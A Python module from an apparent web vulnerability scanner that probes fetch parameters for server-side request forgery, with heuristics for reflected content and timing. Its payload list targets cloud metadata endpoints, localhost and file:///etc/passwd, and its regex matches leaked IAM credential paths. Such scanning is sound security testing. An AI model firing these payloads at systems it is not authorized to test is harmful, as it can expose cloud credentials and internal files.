"""ssrf — Server-Side Request Forgery (best-effort black-box).

True SSRF confirmation needs an out-of-band listener you control. This module
does the in-band part: it targets likely-fetch params, sends internal/metadata
URLs, and flags when internal content is reflected back or behavior clearly
changes. Set opts['ssrf_callback'] to a URL you monitor for OOB confirmation.
"""
import re
from common import Finding

NAME = "ssrf"

FETCH_PARAMS = ["url", "uri", "link", "src", "source", "dest", "destination",
                "redirect", "redirect_uri", "target", "path", "continue", "feed",
                "host", "site", "domain", "callback", "webhook", "image", "img", "load"]

# Tokens that appear only in FETCHED content, never in the request URL itself
# (so reflecting the payload back does NOT trigger a false positive).
METADATA_MARKERS = re.compile(r"(ami-id|instance-id|iam/security-credentials|"
                              r"instance-identity|root:.*:0:0:)", re.IGNORECASE)


def _payloads(callback):
    p = [
        "http://169.254.169.254/latest/meta-data/",              # AWS IMDS
        "http://metadata.google.internal/computeMetadata/v1/",    # GCP
        "http://127.0.0.1:80/",
        "http://localhost/",
        "file:///etc/passwd",
        "http://[::1]/",
    ]
    if callback:
        p.insert(0, callback)
    return p


def _send(client, method, param, val):
    if method == "GET":
        return client.request("GET", params={param: val})
    return client.request("POST", data={param: val})


def run(client, opts):
    method = opts.get("method", "GET").upper()
    callback = opts.get("ssrf_callback")
    params = []
    if opts.get("param"):
        params.append(opts["param"])
    params += [p for p in FETCH_PARAMS if p != opts.get("param")]

    out = []
    for param in params[:6]:  # cap to keep request volume sane
        baseline = _send(client, method, param, "http://example.com/")
        for pl in _payloads(callback):
            r = _send(client, method, param, pl)
            m = METADATA_MARKERS.search(r.body)
            # Guard: ignore if the matched token is merely the reflected payload.
            if m and m.group(0) not in pl:
                out.append(Finding(NAME, "critical", "SSRF — internal content reflected",
                                   f"param '{param}' fetched {pl}", m.group(0)))
                return out
            if callback and pl == callback:
                out.append(Finding(NAME, "high", "Possible SSRF — check your OOB listener",
                                   f"param '{param}' sent to your callback {callback}",
                                   "confirm the hit landed on your listener"))
        # timing heuristic only: fetching an unroutable internal port stalls the
        # server. Length diffs are unreliable (apps echo the URL), so we ignore them.
        r_int = _send(client, method, param, "http://127.0.0.1:1/")
        if r_int.elapsed > baseline.elapsed + 3 and "127.0.0.1:1" not in r_int.body:
            out.append(Finding(NAME, "medium", "Param may drive server-side fetch (SSRF surface)",
                               f"param '{param}' stalled on an internal address; verify manually",
                               f"int={r_int.elapsed:.1f}s vs ext={baseline.elapsed:.1f}s"))
    return out
